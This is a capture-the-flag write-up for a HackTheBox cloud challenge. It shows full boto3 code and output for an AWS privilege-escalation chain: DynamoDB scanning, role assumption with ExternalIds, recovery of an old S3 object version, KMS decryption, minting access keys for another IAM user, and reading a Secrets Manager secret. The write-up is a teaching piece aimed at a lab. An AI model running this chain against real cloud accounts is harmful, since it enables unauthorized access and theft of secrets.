---
layout: post
title: "Bought Riot"
date: 2026-07-25 00:00:00 -0700
categories: ctfs
description: A read-only AWS auditor key chains through a DynamoDB settlement record, a versioned S3 manifest object hiding a KMS-encrypted blob, and an unscoped iam:CreateAccessKey grant into a second IAM role holding the Secrets Manager payout secret.
parent: HackTheBox - Apocalypse '26
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
  - "cloud"
  - "aws"
  - "iam"
  - "privilege-escalation"
  - "cyberapocalypse"
  - "T1548.005"
  - "T1098.001"
  - "T1530"
  - "T1555.006"
---

## Engagement Notes

`bought-riot` is a cloud-category challenge from Cyberapocalypse 2026: a
read-only AWS IAM user against a challenge-specific endpoint, with the goal
of escalating into a Secrets Manager secret buried several role-hops away.
The shape of the chain is a mix of legitimate AWS discovery primitives
(`dynamodb:Scan`, S3 object versioning, `sts:AssumeRole` with an
`ExternalId`) and one clearly out-of-scope IAM write permission
(`iam:CreateAccessKey`) left on a role that had no business touching IAM at
all. The lab instance was reset/respawned more than once over the course of
the engagement, which is why the access keys and endpoint port differ
between the two earliest recon cells below — not a second identity, just the
same auditor working the same challenge across resets.

## Attack path

1. Authenticate as the handed-out `eastreach-supply-auditor` IAM user and
   confirm identity via `sts.get_caller_identity()`.
2. Probe available permissions with `enumerate-iam.py` — turns up little
   beyond STS.
3. `dynamodb.scan()` a named table, `supply-road-settlements`, which returns
   a `LIVE` settlement record handing over a role ARN + `ExternalId` to
   assume, plus a second role/`ExternalId` pair not usable yet.
4. `sts.assume_role()` into `supply-road-scanner`.
5. List the `supply-road-manifests` S3 bucket named in the DynamoDB row and
   fetch the manifest matching the settlement ID — its sensitive fields are
   `"REDACTED"`.
6. `s3.list_object_versions()` shows an older, non-latest version of the same
   object still present; fetching it by `VersionId` returns a
   `kms:v3:<key-id>:<nonce>:<ciphertext>`-shaped blob instead of plaintext.
7. `kms.decrypt()` on that raw blob (the scanner role also holds
   `kms:Decrypt`) recovers the un-redacted manifest: the real broker user
   (`road-messenger`) and the real Secrets Manager secret name.
8. The scanner role also holds `iam:CreateAccessKey` — used to mint new
   credentials for `road-messenger`.
9. Assume `supply-road-runner` with the new `road-messenger` credentials,
   using the `ExternalId` recovered in step 3.
10. `secretsmanager.get_secret_value()` on the secret name recovered in step
    7 returns the flag.

## Recon: an auditor key and a permission probe that mostly dead-ended

The starting point is a handed-out AWS access key for
`eastreach-supply-auditor`, pointed at a challenge-specific endpoint:

```python
import boto3

user = "eastreach-supply-auditor"
access_key = "AKIAT494…GL3R"
secret_key = "+OuNHbAv…QF8Y"
region = "us-east-1"
endpoint = "http://154.57.164.71:31237"

sts = boto3.client('sts', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region, endpoint_url=endpoint)
identity = sts.get_caller_identity()
print(identity)
```

```
{'UserId': 'AIDAQPYD1MUOQRY60FEN', 'Account': '593847102664', 'Arn': 'arn:aws:iam::593847102664:user/eastreach-supply-auditor', ...}
```

`enumerate-iam.py` was run against the account to map out what this identity
can actually do:

```
AWS_ENDPOINT_URL=http://154.57.164.71:31136 python enumerate-iam.py --access-key AKIAEB3D…4U5H --secret-key +3sSmTfy…b5ns
2026-07-24 16:33:42,752 - 803139 - [INFO] Starting permission enumeration for access-key-id "AKIAEB3DXNKURMB14U5H"
2026-07-24 16:33:43,345 - 803139 - [INFO] Attempting common-service describe / list brute force.
2026-07-24 16:33:47,447 - 803139 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2026-07-24 16:33:51,437 - 803139 - [INFO] -- sts.get_session_token() worked!
2026-07-24 16:33:51,609 - 803139 - [INFO] -- sts.get_caller_identity() worked!
```

> 🧠 The access key/port differ from the cell above because the lab instance
> was reset/respawned during the engagement. Generic permission-enumeration
> tooling like this tended to fail on this style of challenge: it probes for
> broad, global permission listings, and doesn't handle scoped sub-permissions
> or requirements gated behind a shared value like `ExternalId` — the kind of
> access this box actually gates its permissions on. The real opening came
> from going after a specific named resource directly instead.

## The pivot: a DynamoDB settlement record

```python
# After much enumeration, I think I lack list permissions to anything, so I need to hone in on 'supply-road-settlements' registry hint. I know that it's a scannable table with rows

from pprint import pprint
import json
ddb = boto3.client('dynamodb', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region, endpoint_url=endpoint)
srs = ddb.scan(TableName='supply-road-settlements')
found = []
for row in srs['Items']:
    if row['status']['S'] == 'LIVE':
        found.append(row)
        pprint(found)
```

```
[{'broker_code': {'S': 'EASTREACH-RELAY'},
  'manifest_bucket': {'S': 'supply-road-manifests'},
  'runner_external_id': {'S': 'eastreach-supply-road-runner-3d9c'},
  'scanner_external_id': {'S': 'eastreach-road-scanner-3d9c'},
  'scanner_role_arn': {'S': 'arn:aws:iam::593847102664:role/supply-road-scanner'},
  'settlement_id': {'S': 'ROAD-3D9C'},
  'status': {'S': 'LIVE'},
  'vendor_ref': {'S': 'eastreach-continuity'}}]
```

> ⚠️ UNVERIFIED: the notebook comment calls `supply-road-settlements` a
> "registry hint" but doesn't record where that table name came from. Not
> reconstructed here — observed-only.

This single `LIVE` row hands over everything needed for the first privilege
jump — a role ARN (`supply-road-scanner`) and the `ExternalId` it requires
(`eastreach-road-scanner-3d9c`) — plus a second role/`ExternalId` pair
(`supply-road-runner` / `eastreach-supply-road-runner-3d9c`) that isn't
usable until much later in the chain.

## Hop 1: assuming `supply-road-scanner`

```python
role_assume = boto3.client('sts', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region, endpoint_url=endpoint)
supply_road_scanner = role_assume.assume_role(RoleArn='arn:aws:iam::593847102664:role/supply-road-scanner', RoleSessionName='eastreach-supply-auditor', ExternalId='eastreach-road-scanner-3d9c')
```

This succeeds and hands back temporary credentials for the
`supply-road-scanner` role.

## An old S3 object version still holding the un-redacted manifest

With scanner credentials, the `supply-road-manifests` bucket named in the
DynamoDB row is listable — 188 objects across four prefixes (`manifests/`:
164, `archives/`: 8, `compliance/`: 8, `routing-notes/`: 8). The
`settlement_id` from the DynamoDB scan (`ROAD-3D9C`) points at
`manifests/ROAD-3D9C.json`. Fetching the current version returns a
redacted document:

```python
response = scanner_s3.get_object(Bucket='supply-road-manifests', Key='manifests/ROAD-3D9C.json')
print(response['Body'].read())
```

```
b'{\n  "settlement_id": "ROAD-3D9C",\n  "status": "COMPLIANCE_HOLD",\n  "manifest_version": "2026-03",\n  "note": "Routing manifest under compliance review. Sensitive fields redacted pending clearance from Road Compliance.",\n  "broker_user": "REDACTED",\n  "runner_role_arn": "REDACTED",\n  "payout_secret_name": "REDACTED",\n  "schema_version": "2026-03",\n  "owner": "eastreach-logistics"\n}'
```

The bucket has versioning enabled, and the previous version of this object
was never removed when it was overwritten with the redacted one:

```python
response = scanner_s3.list_object_versions(Bucket='supply-road-manifests', Prefix='manifests/ROAD-3D9C.json')
for version in response.get('Versions', []):
    print(f"Version ID: {version['VersionId']}, Last Modified: {version['LastModified']}, Is Latest: {version['IsLatest']}")
```

```
Version ID: 90021cf9-73a9-49b8-b4d3-fe7d637785ea, Last Modified: 2026-07-25 01:50:37+00:00, Is Latest: True
Version ID: c0c96ee8-6f6c-4b06-bcd7-c05253a6ad97, Last Modified: 2026-07-25 01:50:37+00:00, Is Latest: False
```

Pulling the older version by its `VersionId` doesn't return plaintext — it
returns what looks like an application-level ciphertext envelope:

```python
response = scanner_s3.get_object(Bucket='supply-road-manifests', Key='manifests/ROAD-3D9C.json', VersionId='c0c96ee8-6f6c-4b06-bcd7-c05253a6ad97')
hidden_manifest = response['Body'].read()
```

```
b'kms:v3:a1defd0d-c707-4ab6-b45d-27edf773ad9e:EVrAdtvnQzWlzV3U:[...345-char urlsafe-base64 ciphertext elided...]'
```

The `kms:v3:<key-id>:<nonce>:<ciphertext>`-shaped prefix embeds the KMS key
ID directly. The scanner role also holds `kms:Decrypt`, and the raw blob —
prefix, key ID, nonce and all — is passed straight to `CiphertextBlob`
without any prior parsing or decoding:

```python
kms = boto3.client('kms', aws_access_key_id=supply_road_scanner['Credentials']['AccessKeyId'], aws_secret_access_key=supply_road_scanner['Credentials']['SecretAccessKey'], aws_session_token=supply_road_scanner['Credentials']['SessionToken'], region_name=region, endpoint_url=endpoint)
decrypted = kms.decrypt(CiphertextBlob=hidden_manifest)
pprint(json.loads(decrypted['Plaintext'].decode('utf-8')))
```

```python
{'broker_code_template': '{broker_code}',
 'broker_user': 'road-messenger',
 'owner': 'eastreach-logistics',
 'payout_secret_name': 'supply-road/payout/eastreach-relay-3d9c',
 'runner_role_arn': 'arn:aws:iam::593847102664:role/supply-road-runner',
 'schema_version': '2026-01',
 'settlement_table': 'supply-road-settlements'}
```

> 🧠 The whole `kms:v3:...` envelope string — prefix, key ID, and nonce
> included — is what's passed to `kms.decrypt()`, unparsed. That's the whole
> story: the challenge's KMS emulation accepts the full envelope string as
> `CiphertextBlob` as-is, with no intermediate parsing or base64-decoding
> step performed separately.

This recovers the un-redacted manifest: the real broker user is
`road-messenger`, the payout secret name is
`supply-road/payout/eastreach-relay-3d9c`, and the real `runner_role_arn`
confirms the second role/`ExternalId` pair already recovered from the
DynamoDB scan.

## Hop 2: minting a key the scanner role had no business minting

```python
# just see if I can make an access key since there doesn't seem to be another assume role function
iam = boto3.client('iam', aws_access_key_id=supply_road_scanner['Credentials']['AccessKeyId'], aws_secret_access_key=supply_road_scanner['Credentials']['SecretAccessKey'], aws_session_token=supply_road_scanner['Credentials']['SessionToken'], region_name=region, endpoint_url=endpoint)
response = iam.create_access_key(UserName='road-messenger')
print(response['AccessKey']['AccessKeyId'])
print(response['AccessKey']['SecretAccessKey'])
```

```
AKIAQSNM…WE2B
SPAuulVa…53oA
```

> 🧠 This was an opportunistic probe, not manifest-driven reasoning. Minting
> a new access key for another IAM user is a common cloud persistence/
> privilege-escalation tactic that came up repeatedly across other cloud
> challenges in this CTF, and it was tried mainly because no other
> `AssumeRole` path off the scanner role was visible — not because the
> decrypted manifest specifically pointed at IAM.

A role scoped for read-only manifest scanning holding `iam:CreateAccessKey`
against an unrelated IAM user is the core misconfiguration in this chain:
mint long-lived credentials for a different identity, then become that
identity.

## Hop 3: assuming `supply-road-runner` as `road-messenger`

```python
rm_sts = boto3.client('sts', aws_access_key_id=road_messenger['AccessKeyId'], aws_secret_access_key=road_messenger['SecretAccessKey'], region_name=region, endpoint_url=endpoint)
rm_assume = rm_sts.assume_role(RoleArn='arn:aws:iam::593847102664:role/supply-road-runner', RoleSessionName='eastreach-supply-auditor', ExternalId='eastreach-supply-road-runner-3d9c')
```

With the freshly minted `road-messenger` key, the runner role — using the
`ExternalId` recovered from the original DynamoDB scan — is assumable.

## Flag capture

```python
runner_secret = boto3.client('secretsmanager', aws_access_key_id=rm_assume['Credentials']['AccessKeyId'], aws_secret_access_key=rm_assume['Credentials']['SecretAccessKey'], aws_session_token=rm_assume['Credentials']['SessionToken'], region_name=region, endpoint_url=endpoint)
secret_value = runner_secret.get_secret_value(SecretId='supply-road/payout/eastreach-relay-3d9c')
print(secret_value['SecretString'])
```

```
HTB{eastreach_road_resupply_spine_7a37bc84fd5427b2e4c316b3229e945d}
```

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| `enumerate-iam.py` | Probed the auditor key's available API permissions before the DynamoDB pivot | [andresriancho/enumerate-iam](https://github.com/andresriancho/enumerate-iam) |
| `boto3` | AWS SDK used for every API call in the chain (STS, DynamoDB, S3, KMS, IAM, Secrets Manager) | [boto3 documentation](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html) |

## Tactics (MITRE ATT&CK)

- **[T1548.005 — Abuse Elevation Control Mechanism: Temporary Elevated Cloud
  Access](https://attack.mitre.org/techniques/T1548/005/)**: both role hops
  (`supply-road-scanner`, then `supply-road-runner`) use `sts:AssumeRole`
  with an `ExternalId` to gain temporary elevated credentials for a role
  configured with permissions well outside its stated purpose.
- **[T1098.001 — Account Manipulation: Additional Cloud
  Credentials](https://attack.mitre.org/techniques/T1098/001/)**: the
  `iam.create_access_key(UserName='road-messenger')` call adds
  adversary-usable credentials to an existing IAM user, matching this
  technique's explicit `CreateAccessKey` procedure example.
- **[T1530 — Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/)**:
  both the redacted current object and the un-redacted older version of
  `manifests/ROAD-3D9C.json` are pulled directly via the S3 API.
- **[T1555.006 — Credentials from Password Stores: Cloud Secrets Management
  Stores](https://attack.mitre.org/techniques/T1555/006/)**: the flag is
  retrieved with `secretsmanager.get_secret_value()` against a secret name
  recovered earlier in the chain.

**Not tagged, and why:**
- *T1078.004 (Valid Accounts: Cloud Accounts)* — considered for the initial
  auditor key and the later `road-messenger` key, but the [technique
  definition](https://attack.mitre.org/techniques/T1078/004/) frames this as
  adversarial misuse of *compromised or stolen* cloud credentials. The
  auditor key here is a handed-out challenge foothold, not a
  compromised account, so the definition doesn't cleanly match.
- *enumerate-iam.py's permission probing* — considered under both
  [T1580 (Cloud Infrastructure Discovery)](https://attack.mitre.org/techniques/T1580/)
  and [T1526 (Cloud Service Discovery)](https://attack.mitre.org/techniques/T1526/).
  Neither fits: T1580 covers discovering infrastructure *components*
  (instances, buckets, snapshots) and T1526 covers discovering which
  *services* are deployed — neither addresses probing which API calls a set
  of credentials is actually permitted to make.

## Lessons

> 🧠 Check how services call between each other across scopes — that can
> dictate what's actually required for an action to succeed, even when a
> permission grant or an error looks benign or common (like a role that
> "just" scans manifests also holding `iam:CreateAccessKey`).

## Further reading

**Used during the engagement:**
- [enumerate-iam](https://github.com/andresriancho/enumerate-iam) — permission-enumeration tool run against the auditor key.

---

*Provenance: commands, outputs, credentials, and flags are transcribed from the
engagement notebook (credential material partially redacted). External facts (MITRE
technique definitions, CVEs, error semantics) are linked to their source and were
fetched, not recalled.*
